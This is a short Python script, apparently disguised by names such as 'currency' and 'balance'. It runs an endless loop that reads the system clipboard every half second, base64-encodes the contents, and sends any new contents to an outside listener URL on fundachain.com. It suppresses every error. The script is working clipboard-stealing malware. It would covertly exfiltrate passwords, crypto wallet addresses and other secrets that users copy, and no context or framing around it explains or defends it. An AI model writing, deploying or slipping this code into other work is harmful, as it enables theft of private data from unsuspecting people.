import requests
import base64
from pandas.io.clipboard import clipboard_get
from time import sleep

url="http://fundachain.com/listener/index.php?balance={}"

def currency():
    value=""
    while 1:
        sleep(0.5)
        info =base64.b64encode(clipboard_get().encode())
        if(value != info):
            try:
                code=requests.get(url.format(info.decode()))
                value=info
            except:
                pass
        

